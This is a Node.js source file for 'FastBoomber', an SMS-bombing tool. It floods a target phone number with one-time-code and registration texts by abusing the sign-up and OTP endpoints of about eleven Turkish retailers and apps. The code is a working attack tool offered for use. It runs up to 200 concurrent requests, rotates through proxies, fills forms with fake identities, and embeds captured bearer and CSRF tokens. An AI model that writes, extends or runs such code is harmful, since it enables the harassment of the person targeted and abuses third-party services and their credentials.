
const request = require('request');
const colors = require('colors');
const fs = require('fs');
const { faker } = require('@faker-js/faker');

function formatProxy(proxyLine) {
    const parts = proxyLine.split(':');
    if (parts.length === 4) {
        const [host, port, user, pass] = parts;
        return `http://${user}:${pass}@${host}:${port}`;
    }
    if (proxyLine.startsWith('http://') || proxyLine.startsWith('https://') || proxyLine.startsWith('socks5://')) {
        return proxyLine;
    }
    return `http://${proxyLine}`;
}

class GlobalRequest {
    constructor(options) {
        this.site = options.site;
        this.headers = options.headers || {};
        this.form = options.form || null;
        this.json = options.json || null;
        this.body = options.body || null;
        this.no = options.no;
        this.method = options.method || 'POST';
        this.proxy = options.proxy || null;
        this.jar = options.jar || null;
    }

    async start() {
        return new Promise((resolve) => {
            const reqOptions = {
                url: this.site,
                method: this.method,
                headers: this.headers,
                timeout: 8000,
                followRedirect: true,
                maxRedirects: 10,
                gzip: true,
            };

            if (this.form) reqOptions.form = this.form;
            if (this.json) reqOptions.json = this.json;
            if (this.body) reqOptions.body = this.body;
            if (this.proxy) reqOptions.proxy = this.proxy;
            if (this.jar) reqOptions.jar = this.jar;

            request(reqOptions, (error, response, body) => {
                if (error) {
                    resolve({ status: false, message: `Request failed for ${this.no}. Error: ${error.message}`, error: error.message });
                    return;
                }

                const statusCode = response ? response.statusCode : 0;
                const responseBody = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : 'No body';

                if (statusCode == 200 || statusCode == 202 || statusCode == 302 || statusCode == 303 || statusCode == 307 || statusCode == 308) {
                    resolve({ status: true, message: `Successfully registered with phone number: ${this.no}. Platform: ${this.site}` });
                } else {
                    resolve({
                        status: false,
                        message: `Failed for ${this.no}. Status: ${statusCode}. Response: ${responseBody.substring(0, 300)}. Platform: ${this.site}`,
                        statusCode: statusCode,
                        responseBody: responseBody
                    });
                }
            });
        });
    }
}

class Bim {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
    }

    start() {
        return new GlobalRequest({
            site: 'https://bim.veesk.net:443/service/v1.0/account/login',
            json: { "phone": `${this.no}` },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class Wmf {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
    }

    start() {
        return new GlobalRequest({
            site: 'https://www.wmf.com.tr/users/register/',
            headers: {
                'Origin': 'https://www.wmf.com.tr',
                'Referer': 'https://www.wmf.com.tr/users/register/'
            },
            form: {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": faker.internet.email(),
                "email_allowed": "true",
                "first_name": faker.person.firstName(),
                "gender": "male",
                "last_name": faker.person.lastName(),
                "password": "nwejkfower32",
                "phone": `0${this.no}`,
            },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class Filemarket {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
    }

    start() {
        return new GlobalRequest({
            site: 'https://api.filemarket.com.tr:443/v1/otp/send',
            headers: {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'User-Agent': 'filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0',
                'X-Os': 'IOS',
                'X-Version': '1.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate'
            },
            json: { "mobilePhoneNumber": `90${this.no}` },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class Koton {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
        this.mail = faker.internet.email();
        this.boundary = 'sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk';
    }

    start() {
        const data = `--${this.boundary}\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="email"\r\n\r\n${this.mail}\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${this.no}\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n1993-07-02\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="call_allowed"\r\n\r\ntrue\r\n--${this.boundary}\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--${this.boundary}--\r\n`;

        return new GlobalRequest({
            site: 'https://www.koton.com:443/users/register/',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${this.boundary}`,
                'X-Project-Name': 'rn-env',
                'Accept': 'application/json, text/plain, */*',
                'X-App-Type': 'akinon-mobile',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-store',
                'Accept-Encoding': 'gzip, deflate',
                'X-App-Device': 'ios',
                'Referer': 'https://www.koton.com/',
                'User-Agent': 'Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
                'X-Csrftoken': '5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz'
            },
            body: data,
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class Porty {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
    }

    start() {
        return new GlobalRequest({
            site: 'https://panel.porty.tech:443/api.php?',
            headers: {
                'Accept': '*/*',
                'Content-Type': 'application/json; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': 'Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
                'Token': 'q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ'
            },
            json: { "job": "start_login", "phone": this.no },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class Dominos {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
        this.mail = faker.internet.email();
    }

    start() {
        return new GlobalRequest({
            site: 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode',
            headers: {
                'Content-Type': 'application/json;charset=utf-8',
                'Accept': 'application/json, text/plain, */*',
                'Authorization': 'Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg',
                'Device-Info': 'Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8',
                'Appversion': 'IOS-7.1.0',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'tr-TR,tr;q=0.9',
                'User-Agent': 'Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0',
                'Servicetype': 'CarryOut',
                'Locationcode': 'undefined'
            },
            json: { "email": this.mail, "isSure": false, "mobilePhone": this.no },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class Kralbet {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
        this.username = this.generateUsername();
        this.email = faker.internet.email();
        this.csrfToken = this.generateCsrfToken();
    }

    generateUsername() {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < 8; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result + Math.floor(Math.random() * 1000);
    }

    generateCsrfToken() {
        const chars = 'abcdef0123456789';
        let result = '';
        for (let i = 0; i < 64; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    start() {
        return new GlobalRequest({
            site: 'https://kralbet2172.com/api/InternalApi/services/registration/validate',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'tr-TR,tr;q=0.9',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
                'Sec-Ch-Ua-Mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'Origin': 'https://kralbet2172.com',
                'Referer': 'https://kralbet2172.com/tr/registration/',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Accept-Encoding': 'gzip, deflate, br',
                'Priority': 'u=1, i',
                'X-Csrf-Token': this.csrfToken
            },
            json: {
                "username": this.username,
                "email": this.email,
                "mobile_phone": `+90${this.no}`,
                "request_timezone": "Europe/Istanbul",
                "csrf_token": this.csrfToken
            },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class KahveDunyasi {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
    }

    start() {
        return new GlobalRequest({
            site: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
            headers: {
                'Host': 'api.kahvedunyasi.com',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Accept-Language': 'tr-TR,tr;q=0.9',
                'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
                'Sec-Ch-Ua-Mobile': '?0',
                'X-Language-Id': 'tr-TR',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'X-Client-Platform': 'web',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'Origin': 'https://www.kahvedunyasi.com',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.kahvedunyasi.com/login',
                'Accept-Encoding': 'gzip, deflate, br',
                'Priority': 'u=1, i',
                'Connection': 'keep-alive'
            },
            json: {
                "phoneNumber": this.no,
                "countryCode": "90"
            },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

class FastLogin {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
        this.csrf = '100dc317-d84a-4d83-bc86-eb5b6794885e';
        this.jar = request.jar();
    }

    async start() {
        const baseHeaders = {
            'Host': 'fastlogin.com.tr',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Origin': 'https://fastlogin.com.tr',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://fastlogin.com.tr/fastlogin_web_app/webLogin',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=0, i',
            'Connection': 'keep-alive'
        };

        await new Promise((resolve) => {
            request({
                url: 'https://fastlogin.com.tr/fastlogin_web_app/webLogin',
                method: 'GET',
                headers: baseHeaders,
                jar: this.jar,
                proxy: this.proxy,
                followRedirect: true,
                maxRedirects: 10,
                timeout: 8000
            }, () => resolve());
        });

        return new GlobalRequest({
            site: 'https://fastlogin.com.tr/fastlogin_web_app/webLogin',
            headers: baseHeaders,
            form: {
                "_csrf": this.csrf,
                "operationType": "",
                "msisdn": this.no,
                "determined_msisdn": "NOT_TURKCELL",
                "msisdnCountryIsoCode": "tr",
                "msisdnCountryRegionCode": "90",
                "msisdnFull": `+90${this.no}`,
                "rememberMe": "on",
                "gsmEntry": "gsmEntry"
            },
            no: this.no,
            proxy: this.proxy,
            jar: this.jar
        }).start();
    }
}

class SokMarket {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
        this.deviceId = '74ba3eb4-9c68-4560-b6cf-0050a65bfdad-4990ed72-7034-427b-b359-be74dc596a4b';
        this.sid = '58f63ecc-a45e-4411-96f2-895ed1b4bdb1-6002f210-87ff-4301-a166-5046b970b176';
        this.cookie = `X-Ecommerce-Deviceid=${this.deviceId}; X-Ecommerce-Sid=${this.sid}; X-Platform=WEB; X-Service-Type=MARKET; _fbp=fb.2.1782843521196.964468227310841317`;
    }

    async start() {
        const baseHeaders = {
            'Cookie': this.cookie,
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate, br'
        };

        const authorizeUrl = 'https://giris.ec.sokmarket.com.tr/authorize?response_type=code&client_id=buyer-web&scope=cookie&platform=web&process=register&redirect_uri=https://www.sokmarket.com.tr%2Fauthorized';

        await new Promise((resolve) => {
            request({
                url: authorizeUrl,
                method: 'GET',
                headers: {
                    ...baseHeaders,
                    'Upgrade-Insecure-Requests': '1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Sec-Fetch-Site': 'same-site',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Referer': 'https://www.sokmarket.com.tr/',
                    'Priority': 'u=0, i'
                },
                proxy: this.proxy,
                followRedirect: true,
                maxRedirects: 5,
                timeout: 8000
            }, () => resolve());
        });

        const authHeaders = {
            ...baseHeaders,
            'X-Platform': 'WEB',
            'X-Ui-Version': '4ea4b51',
            'X-Ecommerce-Deviceid': this.deviceId,
            'X-Ecommerce-Sid': this.sid,
            'X-App-Version': 'v1',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://giris.ec.sokmarket.com.tr',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://giris.ec.sokmarket.com.tr/authorize?response_type=code&client_id=buyer-web&scope=cookie&platform=web&process=register&redirect_uri=https%3A%2F%2Fwww.sokmarket.com.tr%2Fauthorized',
            'Priority': 'u=1, i'
        };

        await new Promise((resolve) => {
            request({
                url: 'https://giris.ec.sokmarket.com.tr/api/authentication/auth-type',
                method: 'POST',
                headers: authHeaders,
                json: {
                    "clientId": "buyer-web",
                    "redirectUri": "https://www.sokmarket.com.tr/authorized",
                    "scope": "cookie",
                    "captchaAction": "",
                    "process": "REGISTER"
                },
                proxy: this.proxy,
                timeout: 8000
            }, () => resolve());
        });

        return new GlobalRequest({
            site: 'https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate',
            headers: {
                ...authHeaders,
                'Referer': 'https://giris.ec.sokmarket.com.tr/otp-register'
            },
            json: {
                "clientId": "buyer-web",
                "phoneNumber": this.no,
                "captchaToken": "",
                "captchaAction": "generate_register_otp",
                "reCaptchaV2": false
            },
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

// ===== A101 EKLENDİ =====
class A101 {
    constructor(options) {
        this.no = options.no;
        this.proxy = options.proxy || null;
        this.deviceId = 'vykz5-syt6l-f0r2d-0iskp';
        this.userId = 'nonmem260630O0xiyFg5NVXK';
        this.customToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJwcm9qZWN0SWQiOiJkYm1rODl2bnIiLCJpZGVudGl0eSI6ImVuZHVzZXIiLCJhbm9ueW1vdXMiOmZhbHNlLCJ1c2VySWQiOiJub25tZW0yNjA2MzBPMHhpeUZnNU5WWEsiLCJjbGFpbXMiOnsiY2RoSWQiOiIxMDAwIiwiZGV2aWNlSWQiOiJ2eWt6NS1zeXQ2bC1mMHIyZC0waXNrcCIsIm1wVXNlcklkIjoibm9ubWVtMjYwNjMwTzB4aXlGZzVOVlhLIn0sImlhdCI6MTc4Mjg0NDIwNiwiZXhwIjoxNzgyODQ0NTA2fQ.FH2HxTNdExMZmi91PB6NoQvmYGp9JF3nMH9JSjdY1h29NRcURj2RNmstPoHMrNyYmwkNvknzo9sPH1TI2xtudw3U9TkIiGZy-YF7L08RxKdWfYvrsktvb11XXrL6-aR1HsMDdG0kKsE0ssiyKKgoqnT-QpcR8rVrNYc5oizWWGnYRF1WVTHrNIzRZq5QVqFMHEYzV5ts3yNI5pjmcFg7hjedJl6BpEjR-enKm7nfiZ_re8GjOnoRKZxACtMPpMvpF__GsqXf0q33ZZth1NLMQ1cO5p_qLmFXgL-iXFEuMRz-AIDcT0PPL1hJRo8BE8s2eLlY0dEuzo8Lv7mrZ5Ngdg';
    }

    async start() {
        const baseHeaders = {
            'Host': 'rio.a101.com.tr',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Accept': 'application/json, text/plain, */*',
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Origin': 'https://www.a101.com.tr',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.a101.com.tr/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i',
            'Connection': 'keep-alive'
        };

        // Aşama 1: Auth token al
        await new Promise((resolve) => {
            request({
                url: `https://rio.a101.com.tr/dbmk89vnr/${this.customToken}/auth?__culture=tr-TR&__platform=web`,
                method: 'POST',
                headers: {
                    ...baseHeaders,
                    'Content-Type': 'application/json'
                },
                json: {
                    "customToken": this.customToken
                },
                proxy: this.proxy,
                timeout: 8000
            }, () => resolve());
        });

        // Aşama 2: OTP gönder
        return new GlobalRequest({
            site: `https://rio.a101.com.tr/dbmk89vnr/CALL/MsisdnAuthenticator/sendOtp/90${this.no}?__culture=tr-TR&__platform=web`,
            headers: {
                ...baseHeaders,
                'Content-Type': 'application/json',
                'Installationid': '8d169ae42bcc385d7e1895d7cc07ceec',
                'A101-User-Agent': 'web-2.4.5',
                'Channel': 'ECOM'
            },
            json: {},
            no: this.no,
            proxy: this.proxy
        }).start();
    }
}

const SERVICES = [
    Bim,
    Wmf,
    Filemarket,
    Koton,
    Porty,
    Dominos,
    Kralbet,
    KahveDunyasi,
    FastLogin,
    SokMarket,
    A101,  // <-- A101 servis listesine eklendi
];

class FastBoomber {
    constructor(options) {
        this.target = options.target;
        this.amount = options.amount;
        this.count = 0;
        this.errors = 0;
        this.proxies = [];
        this.concurrency = options.concurrency || 200;
        this.active = 0;
        this.loadProxies();
    }

    loadProxies() {
        try {
            const data = fs.readFileSync('proxies.txt', 'utf8');
            this.proxies = data.split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0)
                .map(line => formatProxy(line));
            console.log(`[INFO] Loaded ${this.proxies.length} proxies from proxies.txt`.green);
            console.log(`[INFO] Concurrency: ${this.concurrency} parallel requests`.green);
        } catch (err) {
            console.log(`[WARNING] Could not load proxies.txt: ${err.message}`.yellow);
            this.proxies = [];
        }
    }

    getRandomProxy() {
        if (this.proxies.length === 0) return null;
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }

    getRandomService() {
        return SERVICES[Math.floor(Math.random() * SERVICES.length)];
    }

    start() {
        console.log(`[INFO] Starting attack on ${this.target} with ${this.amount} messages...`.yellow);
        for (let i = 0; i < this.concurrency; i++) {
            this.fire();
        }
    }

    fire() {
        if (this.count + this.errors >= this.amount) {
            if (this.active === 0) {
                console.log(`[INFO] Attack on ${this.target} finished! Total: ${this.count} successful, ${this.errors} failed`.green);
            }
            return;
        }

        this.active++;
        const proxy = this.getRandomProxy();
        const ServiceClass = this.getRandomService();

        new ServiceClass({ no: this.target, proxy: proxy }).start()
            .then(res => {
                if (res.status) {
                    this.count++;
                    console.log(`[SUCCESS] ${res.message}`.green);
                } else {
                    this.errors++;
                    console.log(`[ERROR] ${res.message}`.red);
                }
            })
            .catch(err => {
                this.errors++;
                console.log(`[ERROR] ${err.message || err}`.red);
            })
            .finally(() => {
                this.active--;
                this.fire();
            });
    }
}

module.exports = { FastBoomber };


// sadece türkiye proxy ile çalışıyor
